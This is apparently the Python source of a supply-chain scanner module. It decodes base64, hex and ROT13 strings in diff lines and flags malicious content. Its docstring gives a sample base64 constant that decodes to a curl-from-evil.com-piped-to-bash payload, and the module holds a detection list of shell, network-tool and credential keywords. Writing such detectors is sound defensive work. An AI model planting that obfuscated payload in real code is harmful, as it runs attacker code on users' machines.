"""
Base64/hex decode and re-scan: reveals hidden payloads.

Attack pattern:
    # This looks like a harmless constant
    _KEY = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3AgfCBiYXNoJyk="

    # But decoded it's:
    # import os; os.system('curl http://evil.com/p | bash')

This module:
1. Finds base64/hex strings in diff added lines
2. Attempts to decode them
3. Runs the decoded content through the rule engine
4. Reports findings with both the encoded evidence and decoded payload
"""

from __future__ import annotations

import base64
import binascii
import re
from dataclasses import dataclass, field
from typing import Optional

from depvet.models.verdict import FindingCategory, Severity


@dataclass
class DecodedPayload:
    """A successfully decoded suspicious payload."""
    original_encoded: str       # the encoded string (truncated)
    decoded_text: str           # the decoded content
    encoding: str               # "base64" | "hex" | "rot13" | "unicode_escape"
    file: str
    line_number: Optional[int]
    severity: Severity
    description: str
    category: FindingCategory
    cwe: str = "CWE-506"
    sub_findings: list[str] = field(default_factory=list)  # rule hits in decoded content


# Minimum length to bother decoding (avoid false positives on short tokens)
MIN_B64_LENGTH = 20
MIN_HEX_LENGTH = 16

# Suspicious keywords that warrant escalation if found in decoded content
SUSPICIOUS_DECODED_KEYWORDS = [
    r"import\s+os",
    r"import\s+socket",
    r"import\s+subprocess",
    r"import\s+urllib",
    r"exec\s*\(",
    r"eval\s*\(",
    r"os\.system\s*\(",
    r"subprocess\.",
    r"urllib\.request\.",
    r"socket\.",
    r"base64\.b64decode\s*\(",   # double-encoded
    r"/bin/bash",
    r"/bin/sh",
    r"curl\s+http",
    r"wget\s+http",
    r"nc\s+-",
    r"cmd\.exe",
    r"powershell",
    r"AWS_SECRET",
    r"AWS_ACCESS",
    r"password",
    r"private_key",
    r"ssh-rsa",
]

_SUSPICIOUS_RE = re.compile(
    "|".join(SUSPICIOUS_DECODED_KEYWORDS),
    re.IGNORECASE,
)

# Regex to find base64 strings in code
# Looks for: = "...", = b"...", = '...' with base64-like content
_B64_STRING_RE = re.compile(
    r"""[=(\s,]\s*[bB]?["']([A-Za-z0-9+/]{20,}={0,2})["']"""
)

# Regex to find hex strings
_HEX_STRING_RE = re.compile(
    r"""[=(\s,]\s*[bB]?["']([0-9a-fA-F]{16,})["']"""
)


def _try_decode_b64(s: str) -> Optional[str]:
    """Attempt to decode a base64 string. Returns text or None."""
    try:
        # Add padding if needed
        padded = s + "=" * (-len(s) % 4)
        decoded = base64.b64decode(padded)
        # Try to decode as UTF-8
        text = decoded.decode("utf-8", errors="replace")
        # Sanity check: should contain printable content
        printable = sum(1 for c in text if c.isprintable() or c in "\n\t\r")
        if printable / max(len(text), 1) > 0.7:
            return text
    except (binascii.Error, ValueError, UnicodeDecodeError):
        pass
    return None


def _try_decode_hex(s: str) -> Optional[str]:
    """Attempt to decode a hex string. Returns text or None."""
    if len(s) % 2 != 0:
        return None
    try:
        decoded = bytes.fromhex(s)
        text = decoded.decode("utf-8", errors="replace")
        printable = sum(1 for c in text if c.isprintable() or c in "\n\t\r")
        if printable / max(len(text), 1) > 0.7:
            return text
    except (ValueError, UnicodeDecodeError):
        pass
    return None


def _try_decode_rot13(s: str) -> Optional[str]:
    """Try ROT13 decode (used in some obfuscation)."""
    import codecs
    decoded = codecs.decode(s, "rot_13")
    if _SUSPICIOUS_RE.search(decoded):
        return decoded
    return None


def _scan_decoded_content(text: str) -> list[str]:
    """Find suspicious patterns in decoded text. Returns list of descriptions."""
    hits = []
    for m in _SUSPICIOUS_RE.finditer(text):
        snippet = text[max(0, m.start()-10):m.end()+20].strip()
        hits.append(snippet[:60])
    return list(dict.fromkeys(hits))  # deduplicate preserving order


def decode_and_scan(diff_content: str, filepath: str = "") -> list[DecodedPayload]:
    """
    Find encoded strings in diff added lines, decode them, and check for
    suspicious content.

    Returns a list of DecodedPayload for each suspicious decoded string found.
    """
    results: list[DecodedPayload] = []
    added_lines: list[tuple[int, str]] = []

    current_line = 0
    for raw in diff_content.splitlines():
        if raw.startswith("@@"):
            m = re.search(r"\+(\d+)", raw)
            if m:
                current_line = int(m.group(1)) - 1
        elif raw.startswith("+") and not raw.startswith("+++"):
            current_line += 1
            added_lines.append((current_line, raw[1:]))
        elif not raw.startswith("-"):
            current_line += 1

    seen_encoded: set[str] = set()

    for line_num, line in added_lines:

        # ── Try base64 ──────────────────────────────────────────────────────
        for m in _B64_STRING_RE.finditer(line):
            candidate = m.group(1)
            if len(candidate) < MIN_B64_LENGTH:
                continue
            if candidate in seen_encoded:
                continue

            decoded = _try_decode_b64(candidate)
            if decoded and _SUSPICIOUS_RE.search(decoded):
                seen_encoded.add(candidate)
                sub = _scan_decoded_content(decoded)
                sev = Severity.CRITICAL if any(
                    kw in decoded.lower() for kw in ("exec", "eval", "system", "/bin/", "curl ", "wget ")
                ) else Severity.HIGH

                results.append(DecodedPayload(
                    original_encoded=candidate[:50] + ("..." if len(candidate) > 50 else ""),
                    decoded_text=decoded[:200],
                    encoding="base64",
                    file=filepath,
                    line_number=line_num,
                    severity=sev,
                    description=f"base64文字列をデコードすると悪意あるコードが含まれていた: {decoded[:80]!r}",
                    category=FindingCategory.OBFUSCATION,
                    sub_findings=sub,
                ))

        # ── Try hex ─────────────────────────────────────────────────────────
        for m in _HEX_STRING_RE.finditer(line):
            candidate = m.group(1)
            if len(candidate) < MIN_HEX_LENGTH:
                continue
            if candidate in seen_encoded:
                continue
            # Skip if it looks like a hash or color (short + no letters suggesting code)
            if all(c in "0123456789abcdefABCDEF" for c in candidate) and len(candidate) <= 40:
                # Could be a hash — only proceed if decoded content is suspicious
                pass

            decoded = _try_decode_hex(candidate)
            if decoded and _SUSPICIOUS_RE.search(decoded):
                seen_encoded.add(candidate)
                sub = _scan_decoded_content(decoded)
                sev = Severity.CRITICAL if any(
                    kw in decoded.lower() for kw in ("exec", "eval", "system", "bash", "cmd")
                ) else Severity.HIGH

                results.append(DecodedPayload(
                    original_encoded=candidate[:50],
                    decoded_text=decoded[:200],
                    encoding="hex",
                    file=filepath,
                    line_number=line_num,
                    severity=sev,
                    description=f"hex文字列をデコードすると悪意あるコードが含まれていた: {decoded[:80]!r}",
                    category=FindingCategory.OBFUSCATION,
                    sub_findings=sub,
                ))

        # ── Try ROT13 on the full line ───────────────────────────────────────
        if len(line) > 10:
            rot13 = _try_decode_rot13(line)
            if rot13:
                sub = _scan_decoded_content(rot13)
                results.append(DecodedPayload(
                    original_encoded=line[:50],
                    decoded_text=rot13[:200],
                    encoding="rot13",
                    file=filepath,
                    line_number=line_num,
                    severity=Severity.HIGH,
                    description="ROT13エンコードされた行に悪意あるパターンが検出された",
                    category=FindingCategory.OBFUSCATION,
                    sub_findings=sub,
                ))

    return results
